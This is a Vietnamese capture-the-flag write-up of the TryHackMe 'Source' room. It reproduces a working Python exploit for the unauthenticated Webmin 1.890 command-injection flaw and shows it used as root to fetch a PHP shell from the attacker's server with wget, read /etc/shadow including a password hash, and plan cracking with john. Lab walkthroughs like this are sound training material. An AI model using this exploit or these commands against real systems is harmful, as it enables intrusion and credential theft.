---
title: "Tryhackme - Source"
date: "2022-02-04"
tags: [
    "webmin",
    "linux",
    "ssh",
]
---


Hôm nay tôi sẽ giải CTF [Tryhackme - Source](https://tryhackme.com/room/source)

## Reconnaissance

Việc đầu tiên cần làm là quét cổng đang mở trên máy chủ mục tiêu

```python
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbZAxRhWUij6g6MP11OkGSk7vYHRNyQcTIdMmjj1kSvDhyuXS9QbM5t2qe3UMblyLaObwKJDN++KWfzl1+beOrq3sXkTA4Wot1RyYo0hPdQT0GWBTs63dll2+c4yv3nDiYAwtSsPLCeynPEmSUGDjkVnP12gxXe/qCsM2+rZ9tzXtSWiXgWvaxMZiHaQpT1KaY0z6ebzBTI8siU0t+6SMK7rNv1CsUNpGeicfbC5ZOE4/Nbc8cxNl7gDtZbyjdh9S7KTvzkSj2zBJ+8VbzsuZk1yy8uyLDgmuBQ6LzbYUNHkTQhJetVq7utFpRqLdpSJTcsz5PAxd1Upe9DqoYURuL
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYCha8jk+VzcJRRwV41rl8EuJBiy7Cf8xg6tX41bZv0huZdCcCTCq9dLJlzO2V9s+sMp92TpzR5j8NAAuJt0DA=
|   256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJnY5oycmgw6ND6Mw4y0YQWZiHoKhePo4bylKKCP0E5
10000/tcp open  http    syn-ack MiniServ 1.890 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: E9CE0E6E52BEA337BC56F2FD6BF4C996
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Với port 10000 tôi có web server với giao diện Webmin. Tôi thử tìm exploit với webmin

```python
┌──(neo㉿kali)-[~]
└─$ searchsploit webmin          
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                            | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                           | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                       | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                                                   | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                                          | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                                | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                                                    | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                                         | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                                               | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                                         | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                      | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                                                    | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                       | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                          | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                            | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                                 | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                                           | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                                                       | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                                                                                                 | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                                                                                                  | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                               | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                               | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                              | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Với version 1.890, tôi thấy có 1 lỗ hổng RCE có thể khai thác với Metasploit. Tuy nhiên sau 1 lúc kiểm tra thì tôi nhận ra các exploit này đều cần có username và password.

Dạo quanh Google 1 lúc tìm các exploit của Webmin 1.890 thì tôi tìm thấy 1 Poc unauthorizied RCE, nó ở [đây](https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE), nó sẽ tạo lệnh `curl` chứa payload để server trả về command vừa nhập

```python
#!/usr/bin/env python3
import os
import sys


STAIN = """

--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root
"""
usage = """Usage: python3 exploit.py HOST PORT COMMAND

Ex: python3 exploit.py 10.0.0.1 10000 id
                                                                                                                                   
"""

def exploit(target, port, url, command):
    header = 'Referer: https://{}:{}/session_login.cgi'.format(target,port)
    payload = 'user=gotroot&pam=&expired=2|echo "";{}'.format(command)
    os.system("curl -k {} -d '{}' -H '{}'".format(url,payload,header))


if __name__ == '__main__':
    try:
        print(STAIN)
        target = sys.argv[1]
        port = sys.argv[2]
        url = "https://"+target+":"+port+"/password_change.cgi"
        command = sys.argv[3]
        exploit(target, port, url, command)
    except:
        print(STAIN)
        print(usage)
```

Clone nó về từ github và thử command `id`

```python
┌──(neo㉿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE]
└─$ python webmin-1.890_exploit.py 10.10.171.241 10000 id


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
uid=0(root) gid=0(root) groups=0(root)
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
                    
┌──(neo㉿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE]
└─$ 
```

Tạo local http server với python

```python
┌──(neo㉿kali)-[~]
└─$ python -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Sau đó thử upload php shell lên server

```python
┌──(neo㉿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE]
└─$ python webmin-1.890_exploit.py 10.10.171.241 10000 'wget http://10.18.3.74:8000/shell.php'


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
```

Quay lại local http server để kiểm tra

```python
┌──(neo㉿kali)-[~]
└─$ python -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.171.241 - - [30/Aug/2022 05:12:22] "GET /shell.php HTTP/1.1" 200 -
```

Như vậy là tôi đã upload thành công. Tuy nhiên sau bao nỗ lực tôi cũng không thể lấy được rce 
Tuy nhiên thì với quyền *root* tôi cũng có toàn quyền để xem các thư mục 

Trong thư mục *home* tôi tìm thấy user *dark* và *user flag* nằm trong thư mục của user này. 

```python
┌──(neo㉿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE]
└─$ python webmin-1.890_exploit.py 10.10.171.241 10000 'ls -la /home/dark'


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
total 15228
drwxr-xr-x 5 dark dark     4096 Jun 26  2020 .
drwxr-xr-x 3 root root     4096 Jun 26  2020 ..
-rw------- 1 dark dark        7 Jun 26  2020 .bash_history
-rw-r--r-- 1 dark dark      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dark dark     3771 Apr  4  2018 .bashrc
drwx------ 2 dark dark     4096 Jun 26  2020 .cache
drwx------ 3 dark dark     4096 Jun 26  2020 .gnupg
drwxrwxr-x 3 dark dark     4096 Jun 26  2020 .local
-rw-r--r-- 1 dark dark      807 Apr  4  2018 .profile
-rw-r--r-- 1 dark dark        0 Jun 26  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 dark dark       29 Jun 26  2020 user.txt
-rw-rw-r-- 1 dark dark 15550066 Jun 26  2020 webmin_1.890_all.deb
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
```

Còn *root flag* thì hiển nhiên là nằm trong thư mục *root* rồi, dùng lệnh `cat` để xem thôi.

Thêm 1 điều nữa, chính vì tôi là *root* nên tôi có thể xem được file *shadow*

```python
┌──(neo㉿kali)-[~/WebMin-1.890-Exploit-unauthorized-RCE]
└─$ python webmin-1.890_exploit.py 10.10.171.241 10000 'cat /etc/shadow'   


--------------------------------
   ______________    _____   __
  / ___/_  __/   |  /  _/ | / /
  \__ \ / / / /| |  / //  |/ / 
 ___/ // / / ___ |_/ // /|  /  
/____//_/ /_/  |_/___/_/ |_/   
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18439:0:99999:7:::
dark:$6$in/.sNd9dVXME1Tc$9n0cOI6ZzYoYDvD.Zfopq4R4Q/sTDKG0j128H2oFZrctn7CnpZEJ3DQq0w4j9Ruq2osYTopTwx8xSaYnLKhK11:18439:0:99999:7:::
</p>
curl: (56) OpenSSL SSL_read: error:0A000126:SSL routines::unexpected eof while reading, errno 0
```

Và ở đây thì tôi có hash password của user *dark*, kết hợp file *passwd* để `unshadow` và cuối cùng dùng *__john__* để crack hash và tôi cũng sẽ có được password của user này và login bằng SSH.
